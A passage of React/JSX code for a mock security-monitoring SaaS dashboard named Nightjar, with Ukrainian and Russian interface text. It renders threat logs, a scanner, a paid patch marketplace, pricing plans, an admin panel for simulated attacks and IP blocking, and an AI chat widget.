                <div className="text-[10px] text-slate-500">{t.blockedAttacksSub}</div>
              </div>

              <div className="bg-slate-900 p-5 border border-slate-800 space-y-2">
                <div className="flex justify-between items-center text-slate-400 text-xs">
                  <span>{t.creditsBalance}</span>
                  <DollarSign className="w-4 h-4 text-cyan-400" />
                </div>
                <div className="text-3xl font-black text-cyan-400">{credits} CR</div>
                <div className="text-[10px] text-slate-500">{t.creditsSub}</div>
              </div>
            </div>

            <div className="grid lg:grid-cols-12 gap-8 font-mono">
              <div className="lg:col-span-8 bg-slate-900 border border-slate-800 p-6 space-y-4">
                <div className="flex justify-between items-center pb-4 border-b border-slate-800">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-rose-500" />
                    <h3 className="font-bold text-xs text-slate-200">{t.latestLogsTitle}</h3>
                  </div>
                  <button 
                    onClick={() => setActiveTab('logs')}
                    className="text-xs text-rose-400 hover:text-rose-300 font-bold flex items-center gap-1"
                  >
                    {t.viewAllLogs} <ArrowUpRight className="w-3.5 h-3.5" />
                  </button>
                </div>

                <div className="space-y-2 text-xs">
                  {logs.slice(0, 5).map((log, idx) => (
                    <div 
                      key={log.id + '-' + idx} 
                      onClick={() => setSelectedLogDetail(log)}
                      className="p-3 bg-slate-950 border border-slate-850 hover:border-rose-900 cursor-pointer flex items-center justify-between gap-4 transition-all"
                    >
                      <div className="flex items-center gap-3">
                        <span className={`px-2 py-0.5 text-[10px] font-bold ${
                          log.severity === 'CRITICAL' ? 'bg-rose-950 text-rose-400 border border-rose-800' :
                          log.severity === 'HIGH' ? 'bg-orange-950 text-orange-400 border border-orange-800' :
                          log.severity === 'WARNING' ? 'bg-yellow-950 text-yellow-400 border border-yellow-800' :
                          'bg-slate-800 text-slate-400'
                        }`}>
                          {log.severity}
                        </span>
                        <div>
                          <span className="text-slate-200 font-bold block">{log.type}</span>
                          <span className="text-slate-500 text-[10px]">{log.target}</span>
                        </div>
                      </div>

                      <div className="text-right">
                        <span className="text-slate-400 block">{log.IP}</span>
                        <span className="text-slate-600 text-[10px]">{log.timestamp}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="lg:col-span-4 space-y-6">
                <div className="bg-slate-900 border border-slate-800 p-6 space-y-4">
                  <h3 className="font-bold text-xs text-slate-200 flex items-center gap-2">
                    <Server className="w-4 h-4 text-emerald-400" />
                    {t.protectedSites}
                  </h3>

                  <div className="space-y-3">
                    {[
                      { url: 'https://client-corp.com', status: 'PROTECTED 24/7', latency: '42ms', waf: 'ACTIVE' },
                      { url: 'https://store-app.io', status: 'WARNING', latency: '68ms', waf: 'ACTIVE' },
                      { url: 'https://api.internal-node.dev', status: 'PROTECTED 24/7', latency: '19ms', waf: 'ACTIVE' },
                    ].map((site, i) => (
                      <div key={i} className="p-3 bg-slate-950 border border-slate-850 flex items-center justify-between text-xs">
                        <div>
                          <span className="font-bold block text-slate-200">{site.url}</span>
                          <span className="text-[10px] text-slate-500">{t.latency}: {site.latency}</span>
                        </div>
                        <span className={`px-2 py-0.5 text-[10px] font-bold ${
                          site.status.includes('PROTECTED') ? 'bg-emerald-950 text-emerald-400 border border-emerald-800' : 'bg-yellow-950 text-yellow-400 border border-yellow-800'
                        }`}>
                          {site.status}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'logs' && (
          <div className="space-y-6 animate-fade-in font-mono">
            <div className="bg-slate-900 p-6 border border-slate-800 space-y-6">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                <div>
                  <h2 className="text-lg font-black text-slate-100 flex items-center gap-2">
                    <Terminal className="text-rose-500 w-5 h-5" />
                    SIEM TELEMETRY & THREAT FEED (24/7 STREAM)
                  </h2>
                  <p className="text-xs text-slate-400">ПОТОК МЕРЕЖЕВИХ ПОДІЙ ТА ВИЯВЛЕННЯ АНОМАЛІЙ В РЕАЛЬНОМУ ЧАСІ</p>
                </div>

                <div className="flex flex-wrap items-center gap-3">
                  <div className="relative">
                    <Search className="w-4 h-4 text-slate-500 absolute left-3 top-2.5" />
                    <input
                      type="text"
                      placeholder="ПОШУК ПО IP, ТИПУ..."
                      value={logSearchQuery}
                      onChange={(e) => setLogSearchQuery(e.target.value)}
                      className="bg-slate-950 border border-slate-800 pl-9 pr-4 py-2 text-xs text-slate-200 focus:outline-none focus:border-rose-500 font-mono"
                    />
                  </div>

                  <select
                    value={logFilterSeverity}
                    onChange={(e) => setLogFilterSeverity(e.target.value)}
                    className="bg-slate-950 border border-slate-800 px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-rose-500 font-mono"
                  >
                    <option value="ALL">УСІ УРОВНІ КРИТИЧНОСТІ</option>
                    <option value="CRITICAL">CRITICAL</option>
                    <option value="HIGH">HIGH</option>
                    <option value="WARNING">WARNING</option>
                    <option value="INFO">INFO</option>
                  </select>
                </div>
              </div>

              <div className="bg-slate-950 border border-slate-850 overflow-hidden text-xs">
                <div className="grid grid-cols-12 bg-slate-900/80 p-3 text-slate-400 font-bold border-b border-slate-800">
                  <div className="col-span-2">ЧАС</div>
                  <div className="col-span-2">КРИТИЧНІСТЬ</div>
                  <div className="col-span-3">ТИП ПОДІЇ</div>
                  <div className="col-span-3">ЦІЛЬ / ДЖЕРЕЛО</div>
                  <div className="col-span-2 text-right">IP АДРЕСА</div>
                </div>

                <div className="divide-y divide-slate-900 max-h-[550px] overflow-y-auto">
                  {filteredLogs.map((log, idx) => (
                    <div 
                      key={log.id + '-logtab-' + idx} 
                      onClick={() => setSelectedLogDetail(log)}
                      className="grid grid-cols-12 p-3 items-center hover:bg-slate-900/60 cursor-pointer transition-colors"
                    >
                      <div className="col-span-2 text-slate-500">{log.timestamp}</div>
                      <div className="col-span-2">
                        <span className={`px-2 py-0.5 text-[10px] font-bold inline-block ${
                          log.severity === 'CRITICAL' ? 'bg-rose-950 text-rose-400 border border-rose-800' :
                          log.severity === 'HIGH' ? 'bg-orange-950 text-orange-400 border border-orange-800' :
                          log.severity === 'WARNING' ? 'bg-yellow-950 text-yellow-400 border border-yellow-800' :
                          'bg-slate-800 text-slate-400'
                        }`}>
                          {log.severity}
                        </span>
                      </div>
                      <div className="col-span-3 text-slate-200 font-bold">{log.type}</div>
                      <div className="col-span-3 text-slate-400 truncate">{log.target}</div>
                      <div className="col-span-2 text-right text-rose-400">{log.IP}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'scanner' && (
          <div className="space-y-8 animate-fade-in font-mono">
            <div className="bg-slate-900 p-6 md:p-8 border border-slate-800 space-y-6">
              <div className="space-y-2">
                <span className="bg-rose-950 text-rose-400 text-[10px] font-bold px-3 py-1 uppercase border border-rose-800">
                  NIGHTJAR ACTIVE VULNERABILITY PROBE
                </span>
                <h2 className="text-2xl font-black text-slate-100">{t.scannerTitle}</h2>
                <p className="text-xs text-slate-400 max-w-2xl">{t.scannerDesc}</p>
              </div>

              <form onSubmit={runActiveScan} className="flex flex-col sm:flex-row gap-3">
                <input
                  type="url"
                  required
                  placeholder={t.scanPlaceholder}
                  value={scanUrl}
                  onChange={(e) => setScanUrl(e.target.value)}
                  className="flex-1 bg-slate-950 border border-slate-800 px-4 py-3 text-xs text-slate-200 focus:outline-none focus:border-rose-500 font-mono"
                />
                <button
                  type="submit"
                  disabled={isScanning}
                  className="px-6 py-3 bg-rose-600 hover:bg-rose-500 disabled:opacity-50 text-slate-950 font-black text-xs transition-all flex items-center justify-center gap-2 shadow-lg shadow-rose-950"
                >
                  {isScanning ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      <span>{t.scanning}</span>
                    </>
                  ) : (
                    <>
                      <Crosshair className="w-4 h-4" />
                      <span>{t.btnStartScan}</span>
                    </>
                  )}
                </button>
              </form>

              {scanResult && (
                <div className="mt-8 bg-slate-950 p-6 border border-slate-800 space-y-6 animate-fade-in">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-850">
                    <div>
                      <span className="text-[10px] text-slate-500">TARGET:</span>
                      <h3 className="text-base font-bold text-slate-200">{scanResult.target}</h3>
                    </div>
                    <div className="flex items-center gap-4">
                      <div className="text-right">
                        <span className="text-[10px] text-slate-500 block">SECURITY SCORE:</span>
                        <span className={`text-2xl font-black ${scanResult.score > 80 ? 'text-emerald-400' : 'text-rose-500'}`}>
                          {scanResult.score} / 100
                        </span>
                      </div>
                    </div>
                  </div>

                  {scanResult.items.length === 0 ? (
                    <div className="text-center py-8 space-y-2">
                      <ShieldCheck className="w-12 h-12 text-emerald-400 mx-auto" />
                      <h4 className="font-bold text-slate-200">КРИТИЧНИХ УРАЗЛИВОСТЕЙ НЕ ВИЯВЛЕНО</h4>
                      <p className="text-xs text-slate-400">ВАШ САЙТ ВІДПОВІДАЄ СТАНДАРТАМ БЕЗОПАСНОСТІ OWASP TOP 10.</p>
                    </div>
                  ) : (
                    <div className="space-y-4">
                      <h4 className="font-bold text-xs text-rose-500 uppercase tracking-widest">ВИЯВЛЕНІ ВЕКТОРИ РИЗИКУ:</h4>
                      <div className="space-y-3">
                        {scanResult.items.map((item) => (
                          <div key={item.id} className="p-4 bg-slate-900 border border-slate-800 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
                            <div className="space-y-1">
                              <div className="flex items-center gap-2">
                                <span className="bg-rose-950 text-rose-400 text-[10px] font-bold px-2 py-0.5 border border-rose-800">
                                  {item.severity}
                                </span>
                                <span className="text-xs text-slate-400">{item.cve}</span>
                              </div>
                              <h5 className="font-bold text-sm text-slate-200">{item.title}</h5>
                              <p className="text-xs text-slate-400 leading-relaxed">{item.description}</p>
                            </div>

                            <button
                              onClick={() => {
                                orderRemediation(item);
                                setActiveTab('remediation');
                              }}
                              className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-black text-xs transition-all shrink-0"
                            >
                              ВИПРАВИТИ ЗА {item.price} CR
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        )}

        {activeTab === 'remediation' && (
          <div className="space-y-8 animate-fade-in font-mono">
            <div className="bg-slate-900 p-6 md:p-8 border border-slate-800 space-y-6">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                <div>
                  <h2 className="text-xl font-black text-slate-100 flex items-center gap-2">
                    <Wrench className="text-rose-500 w-5 h-5" />
                    МАРКЕТПЛЕЙС ПАТЧИНГУ & ЗАЯВКИ В SOC
                  </h2>
                  <p className="text-xs text-slate-400">НАТИСНІТЬ «ВИПРАВИТИ» -- ІНЖЕНЕРИ NIGHTJAR SOC ОПЕРАТИВНО СТВОРЯТЬ ПАТЧ АБО УСУНУТЬ УРАЗЛИВІСТЬ В КОДІ.</p>
                </div>
                
                <div className="bg-slate-950 p-4 border border-slate-800 text-right">
                  <span className="text-[10px] text-slate-500 block">ВАШ БАЛАНС КРЕДИТІВ:</span>
                  <span className="text-xl font-black text-yellow-400">{credits} CR</span>
                </div>
              </div>

              <div className="space-y-4">
                <h3 className="font-bold text-xs text-slate-200">ВИЯВЛЕНІ УРАЗЛИВОСТІ НА ВАШИХ РЕСУРСАХ:</h3>
                <div className="grid gap-4">
                  {vulnerabilities.map(vuln => (
                    <div key={vuln.id} className="bg-slate-950 p-5 border border-slate-850 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
                      <div className="space-y-2 max-w-2xl">
                        <div className="flex items-center gap-2">
                          <span className={`px-2 py-0.5 text-[10px] font-bold ${
                            vuln.severity === 'CRITICAL' ? 'bg-rose-950 text-rose-400 border border-rose-800' :
                            vuln.severity === 'HIGH' ? 'bg-orange-950 text-orange-400 border border-orange-800' :
                            'bg-yellow-950 text-yellow-400 border border-yellow-800'
                          }`}>
                            {vuln.severity}
                          </span>
                          <span className="text-xs text-slate-500">{vuln.cve}</span>
                          <span className="text-xs text-rose-400">[{vuln.target}]</span>
                        </div>
                        <h4 className="font-bold text-sm text-slate-200">{vuln.title}</h4>
                        <p className="text-xs text-slate-400 leading-relaxed">{vuln.description}</p>
                      </div>

                      <div className="flex items-center gap-3">
                        {vuln.status === 'OPEN' && (
                          <button
                            onClick={() => orderRemediation(vuln)}
                            className="px-5 py-2.5 bg-rose-600 hover:bg-rose-500 text-slate-950 font-black text-xs transition-all flex items-center gap-2"
                          >
                            <span>ВИПРАВИТИ</span>
                            <span className="bg-rose-950 text-rose-300 px-2 py-0.5 text-[10px]">{vuln.price} CR</span>
                          </button>
                        )}

                        {vuln.status === 'IN_PROGRESS' && (
                          <span className="px-4 py-2 bg-yellow-950/60 text-yellow-400 border border-yellow-800 text-xs font-bold flex items-center gap-2 animate-pulse">
                            <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                            <span>ПАТЧИНГ У ПРОЦЕСІ (SOC)</span>
                          </span>
                        )}

                        {vuln.status === 'RESOLVED' && (
                          <span className="px-4 py-2 bg-emerald-950 text-emerald-400 border border-emerald-800 text-xs font-bold flex items-center gap-1.5">
                            <CheckCircle2 className="w-4 h-4" />
                            <span>УСУНЕНО ТА ПЕРЕВІРЕНО</span>
                          </span>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="pt-6 border-t border-slate-800 space-y-4">
                <h3 className="font-bold text-xs text-slate-200">ІСТОРІЯ ТІКЕТІВ НА ВИПРАВЛЕННЯ:</h3>
                <div className="bg-slate-950 border border-slate-850 overflow-hidden text-xs">
                  <div className="grid grid-cols-12 bg-slate-900/80 p-3 text-slate-400 font-bold border-b border-slate-800">
                    <div className="col-span-2">ID ТІКЕТА</div>
                    <div className="col-span-4">ПОСЛУГА / ПАТЧ</div>
                    <div className="col-span-2">ВАРТІСТЬ</div>
                    <div className="col-span-2">ДАТА</div>
                    <div className="col-span-2 text-right">СТАТУС</div>
                  </div>

                  <div className="divide-y divide-slate-900">
                    {tickets.map(tkt => (
                      <div key={tkt.id} className="grid grid-cols-12 p-3 items-center">
                        <div className="col-span-2 text-rose-400">{tkt.id}</div>
                        <div className="col-span-4 text-slate-200 font-bold">{tkt.title}</div>
                        <div className="col-span-2 text-yellow-400">{tkt.cost} CR</div>
                        <div className="col-span-2 text-slate-500">{tkt.date}</div>
                        <div className="col-span-2 text-right">
                          <span className={`px-2 py-0.5 text-[10px] font-bold ${
                            tkt.status === 'COMPLETED' ? 'bg-emerald-950 text-emerald-400 border border-emerald-800' : 'bg-yellow-950 text-yellow-400 border border-yellow-800'
                          }`}>
                            {tkt.status}
                          </span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'pricing' && (
          <div className="space-y-8 animate-fade-in font-mono">
            <div className="bg-slate-900 p-6 md:p-8 border border-slate-800 space-y-8">
              <div className="text-center max-w-3xl mx-auto space-y-3">
                <span className="bg-rose-950 text-rose-400 border border-rose-800 text-[10px] font-bold px-3 py-1 uppercase tracking-wider">
                  CONTINUOUS MANAGED DEFENSE 24/7
                </span>
                <h2 className="text-2xl font-black text-slate-100">{t.pricingTitle}</h2>
                <p className="text-xs text-slate-400 leading-relaxed">{t.pricingDesc}</p>

                <div className="pt-4 flex justify-center items-center gap-3">
                  <span className={`text-xs ${billingCycle === 'monthly' ? 'text-slate-100 font-bold' : 'text-slate-500'}`}>{t.monthly}</span>
                  <button
                    onClick={() => setBillingCycle(prev => prev === 'monthly' ? 'yearly' : 'monthly')}
                    className="w-12 h-6 bg-slate-950 border border-slate-800 p-1 transition-all relative"
                  >
                    <div className={`w-4 h-4 bg-rose-500 transition-all ${billingCycle === 'yearly' ? 'translate-x-6' : 'translate-x-0'}`}></div>
                  </button>
                  <span className={`text-xs flex items-center gap-1 ${billingCycle === 'yearly' ? 'text-slate-100 font-bold' : 'text-slate-500'}`}>
                    {t.yearly} <span className="bg-rose-950 text-rose-400 text-[9px] px-1.5 py-0.5 border border-rose-800">{t.discount20}</span>
                  </span>
                </div>
              </div>

              <div className="grid md:grid-cols-3 gap-6 pt-4">
                {SUBSCRIPTION_PLANS.map(plan => {
                  const isCurrent = currentSubscription.planId === plan.id;
                  const calculatedPrice = billingCycle === 'yearly' ? Math.floor(plan.price * 0.8) : plan.price;

                  return (
                    <div 
                      key={plan.id}
                      className={`p-6 flex flex-col justify-between space-y-6 transition-all relative border ${
                        plan.popular
                          ? 'bg-slate-900 border-2 border-rose-500 shadow-xl shadow-rose-950/40'
                          : 'bg-slate-950 border-slate-850 hover:border-slate-700'
                      }`}
                    >
                      {plan.popular && (
                        <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-rose-500 text-slate-950 font-black text-[10px] uppercase tracking-wider px-3 py-0.5">
                          RECOMMENDED 24/7
                        </div>
                      )}

                      <div className="space-y-4">
                        <div>
                          <h3 className="text-base font-bold text-slate-100">{plan.name}</h3>
                          <p className="text-xs text-slate-400 mt-1 leading-relaxed">{plan.description}</p>
                        </div>

                        <div className="py-2 border-y border-slate-850">
                          <span className="text-3xl font-black text-slate-100">${calculatedPrice}</span>
                          <span className="text-xs text-slate-500"> / {plan.period}</span>
                        </div>

                        <ul className="space-y-2.5 text-xs text-slate-300">
                          {plan.features.map((feat, idx) => (
                            <li key={idx} className="flex items-start gap-2">
                              <Check className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                              <span className="leading-snug">{feat}</span>
                            </li>
                          ))}
                        </ul>
                      </div>

                      <button
                        onClick={() => handleSelectPlan(plan)}
                        className={`w-full py-3 font-bold text-xs transition-all flex items-center justify-center gap-2 border ${
                          isCurrent
                            ? 'bg-slate-800 text-emerald-400 border-emerald-500/40 cursor-default'
                            : plan.popular
                              ? 'bg-rose-600 hover:bg-rose-500 text-slate-950 border-rose-400 font-black'
                              : 'bg-slate-900 hover:bg-slate-850 text-slate-200 border-slate-800'
                        }`}
                      >
                        {isCurrent ? (
                          <>
                            <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                            <span>{t.currentPlan}</span>
                          </>
                        ) : (
                          <>
                            <Clock className="w-4 h-4" />
                            <span>{t.selectPlan}</span>
                          </>
                        )}
                      </button>
                    </div>
                  );
                })}
              </div>

              <div className="bg-slate-950 p-6 border border-slate-850 flex flex-col md:flex-row justify-between items-center gap-4">
                <div className="space-y-1">
                  <span className="text-[10px] text-slate-500">УПРАВЛІННЯ ПОСТІЙНИМ ЗАХИСТОМ:</span>
                  <h4 className="text-sm font-bold text-slate-200">
                    ПОТОЧНИЙ ТАРИФ: <span className="text-emerald-400">{currentSubscription.planName}</span> (АКТИВНИЙ)
                  </h4>
                  <p className="text-xs text-slate-400">НАСТУПНЕ СПИСАННЯ АБОНПЛАТИ: {currentSubscription.nextBillingDate}</p>
                </div>

                <div className="flex gap-3">
                  <button 
                    onClick={() => alert("Автопродовження оновлено!")}
                    className="px-4 py-2 bg-slate-900 hover:bg-slate-800 text-slate-300 text-xs font-bold border border-slate-800"
                  >
                    {t.autoRenew}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'admin' && (
          <div className="space-y-8 animate-fade-in font-mono">
            <div className="bg-slate-900 p-6 md:p-8 border-2 border-rose-600/40 space-y-8">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-slate-800">
                <div>
                  <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-rose-950 text-rose-400 border border-rose-800 text-xs font-bold uppercase mb-2">
                    <Lock className="w-3.5 h-3.5" /> SOC CHIEF CONSOLE (RESTRICTED ACCESS)
                  </div>
                  <h2 className="text-2xl font-black text-slate-100">УДАЛЕННОЕ УПРАВЛЕНИЕ И ИНЖЕКТОР АТАК</h2>
                  <p className="text-xs text-slate-400">ПАНЕЛЬ УПРАВЛЕНИЯ ОПЕРАТОРА БЕЗОПАСНОСТИ: БЛОКИРОВКА IP, ЗАКРЫТИЕ ТИКЕТОВ И СИМУЛЯЦИЯ УГРОЗ.</p>
                </div>

                <div className="flex items-center gap-2">
                  <span className="w-3 h-3 bg-rose-500 animate-pulse"></span>
                  <span className="text-xs text-rose-400 font-bold">SOC NODE ACTIVE</span>
                </div>
              </div>

              <div className="space-y-4">
                <h3 className="font-bold text-xs text-slate-200 flex items-center gap-2">
                  <Play className="w-4 h-4 text-rose-500" />
                  ГЕНЕРАТОР / ИНЖЕКТОР ТЕСТОВЫХ УГРОЗ
                </h3>
                <p className="text-xs text-slate-400">НАЖМИТЕ НА ТИП АТАКИ ДЛЯ ИМИТАЦИИ РЕАЛЬНОГО ПРОНИКНОВЕНИЯ В ИНФРАСТРУКТУРУ КЛИЕНТА:</p>

                <div className="flex flex-wrap gap-3">
                  {[
                    'DDoS UDP Flood Attack',
                    'SQL Injection Payload (/api/v1/auth)',
                    'Zero-Day Remote Code Execution (RCE)',
                    'Brute Force SSH Login Attempt'
                  ].map((threat, idx) => (
                    <button
                      key={idx}
                      disabled={isSimulatingAttack}
                      onClick={() => injectSimulatedThreat(threat)}
                      className="px-4 py-2.5 bg-slate-950 hover:bg-rose-950/40 border border-slate-800 hover:border-rose-500 text-slate-200 hover:text-rose-300 text-xs font-bold transition-all flex items-center gap-2 disabled:opacity-50"
                    >
                      <Zap className="w-3.5 h-3.5 text-rose-500" />
                      <span>ИМИТИРОВАТЬ: {threat}</span>
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-4 pt-4 border-t border-slate-800">
                <h3 className="font-bold text-xs text-slate-200 flex items-center gap-2">
                  <Wrench className="w-4 h-4 text-yellow-400" />
                  УПРАВЛЕНИЕ КЛИЕНТСКИМИ ЗАЯВКАМИ ПАТЧИНГА (SOC OPERATOR VIEW)
                </h3>

                <div className="space-y-3">
                  {tickets.filter(t => t.status === 'IN_PROGRESS').length === 0 ? (
                    <p className="text-xs text-slate-500 italic">АКТИВНЫХ ЗАЯВОК, ТРЕБУЮЩИХ РУЧНОГО ПАТЧИНГА, НЕТ.</p>
                  ) : (
                    tickets.filter(t => t.status === 'IN_PROGRESS').map(tkt => (
                      <div key={tkt.id} className="p-4 bg-slate-950 border border-yellow-800/40 flex items-center justify-between gap-4">
                        <div>
                          <span className="text-xs font-bold text-yellow-400 block">{tkt.id}: {tkt.title}</span>
                          <span className="text-[10px] text-slate-400">КЛИЕНТ: {tkt.client} | ОПЛАЧЕНО: {tkt.cost} CR</span>
                        </div>
                        <button
                          onClick={() => resolveTicket(tkt.id, tkt.vulnId)}
                          className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-black text-xs transition-all"
                        >
                          ПОДТВЕРДИТЬ ИСПРАВЛЕНИЕ ПАТЧА ✓
                        </button>
                      </div>
                    ))
                  )}
                </div>
              </div>

              <div className="space-y-4 pt-4 border-t border-slate-800">
                <h3 className="font-bold text-xs text-slate-200 flex items-center gap-2">
                  <ShieldAlert className="w-4 h-4 text-rose-500" />
                  ГЛОБАЛЬНЫЙ СПИСОК БЛОКИРОВОК (WAF BLACKLIST)
                </h3>

                <div className="flex flex-wrap gap-2">
                  {firewallBlockIPs.map((ip, i) => (
                    <span key={i} className="px-3 py-1.5 bg-slate-950 border border-slate-800 text-xs text-rose-400 flex items-center gap-2">
                      <span>{ip}</span>
                      <XCircle 
                        className="w-3.5 h-3.5 cursor-pointer hover:text-rose-200"
                        onClick={() => setFirewallBlockIPs(prev => prev.filter(item => item !== ip))}
                      />
                    </span>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}
      </main>

      {selectedLogDetail && (
        <div className="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-sm flex items-center justify-center p-4 font-mono">
          <div className="bg-slate-900 border-2 border-slate-800 max-w-xl w-full p-6 space-y-6 shadow-2xl animate-fade-in">
            <div className="flex justify-between items-start pb-4 border-b border-slate-800">
              <div>
                <span className="text-[10px] text-rose-500">{selectedLogDetail.id}</span>
                <h3 className="text-base font-bold text-slate-100">{selectedLogDetail.type}</h3>
              </div>
              <button 
                onClick={() => setSelectedLogDetail(null)}
                className="p-1 bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-slate-100"
              >
                ✕
              </button>
            </div>

            <div className="space-y-4 text-xs">
              <div className="grid grid-cols-2 gap-4">
                <div className="bg-slate-950 p-3 border border-slate-850">
                  <span className="text-slate-500 text-[10px] block">КРИТИЧНІСТЬ:</span>
                  <span className="text-rose-400 font-bold">{selectedLogDetail.severity}</span>
                </div>
                <div className="bg-slate-950 p-3 border border-slate-850">
                  <span className="text-slate-500 text-[10px] block">IP АТАКУЮЧОГО:</span>
                  <span className="text-cyan-400 font-bold">{selectedLogDetail.IP}</span>
                </div>
              </div>

              <div className="bg-slate-950 p-3 border border-slate-850">
                <span className="text-slate-500 text-[10px] block">ЦІЛЬОВИЙ URI:</span>
                <span className="text-slate-200">{selectedLogDetail.target}</span>
              </div>

              {selectedLogDetail.payload && (
                <div className="bg-slate-950 p-3 border border-slate-850 space-y-1">
                  <span className="text-slate-500 text-[10px] block">PAYLOAD / ТІЛО АТАКИ:</span>
                  <code className="text-rose-300 block break-all text-[11px]">{selectedLogDetail.payload}</code>
                </div>
              )}
            </div>

            <div className="flex gap-3 pt-2">
              <button
                onClick={() => {
                  blockIP(selectedLogDetail.IP);
                  setSelectedLogDetail(null);
                }}
                className="flex-1 py-2.5 bg-rose-600 hover:bg-rose-500 text-slate-950 font-black text-xs transition-all"
              >
                ЗАБЛОКУВАТИ IP ({selectedLogDetail.IP}) В WAF
              </button>
              <button
                onClick={() => setSelectedLogDetail(null)}
                className="px-5 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold"
              >
                ЗАКРИТИ
              </button>
            </div>
          </div>
        </div>
      )}

      {/* AI КОНСУЛЬТАНТ У ПРАВОМУ НИЖНЬОМУ КУТКУ */}
      <div className="fixed bottom-6 right-6 z-50 font-mono">
        {isAiOpen ? (
          <div className="bg-slate-900 border-2 border-rose-500 w-80 sm:w-96 rounded-none shadow-2xl flex flex-col h-[420px] animate-fade-in">
            <div className="bg-rose-950 border-b border-rose-800 p-3 flex justify-between items-center text-xs font-bold text-rose-300">
              <div className="flex items-center gap-2">
                <Bot className="w-4 h-4 text-rose-500" />
                <span>{t.aiChatTitle}</span>
              </div>
              <button onClick={() => setIsAiOpen(false)} className="text-slate-400 hover:text-white">✕</button>
            </div>

            <div className="flex-1 p-3 overflow-y-auto space-y-3 text-xs bg-slate-950">
              {aiMessages.map((msg, index) => (
                <div key={index} className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                  <div className={`p-2.5 max-w-[85%] text-[11px] leading-relaxed border ${
                    msg.sender === 'user' 
                      ? 'bg-rose-950/60 border-rose-700 text-rose-200' 
                      : 'bg-slate-900 border-slate-800 text-slate-300'
                  }`}>
                    {msg.text}
                  </div>
                </div>
              ))}
            </div>

            <form onSubmit={handleSendAiMessage} className="p-2 bg-slate-900 border-t border-slate-800 flex gap-2">
              <input
                type="text"
                placeholder={t.aiChatPlaceholder}
                value={aiInput}
                onChange={(e) => setAiInput(e.target.value)}
                className="flex-1 bg-slate-950 border border-slate-800 px-3 py-2 text-[11px] text-slate-200 focus:outline-none focus:border-rose-500"
              />
              <button type="submit" className="px-3 bg-rose-600 hover:bg-rose-500 text-slate-950 font-black">
                <Send className="w-3.5 h-3.5" />
              </button>
            </form>
          </div>
        ) : (
          <button
            onClick={() => setIsAiOpen(true)}
            className="w-14 h-14 bg-rose-600 hover:bg-rose-500 text-slate-950 border-2 border-rose-400 shadow-2xl flex items-center justify-center transition-all hover:scale-105"
            title="Nightjar AI Consultant"
          >
            <Bot className="w-7 h-7 text-slate-950 animate-pulse" />
          </button>
        )}
      </div>

      <footer className="border-t border-slate-900 bg-slate-950 py-8 text-xs text-slate-500 mt-20 font-mono">
        <div className="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row justify-between items-center gap-4">
          <div className="flex items-center gap-2">
            <NightjarLogoIcon className="w-4 h-4" />
            <span className="font-bold text-slate-400">NIGHTJAR SIEM SAAS PLATFORM © 2026</span>
          </div>
          <div className="flex gap-4 text-[10px]">
            <span>SOC TELEMETRY: ONLINE</span>
            <span>•</span>
            <span>ACTIVE SENSORS: 8</span>
            <span>•</span>
            <span>CONTINUOUS PROTECTION 24/7</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
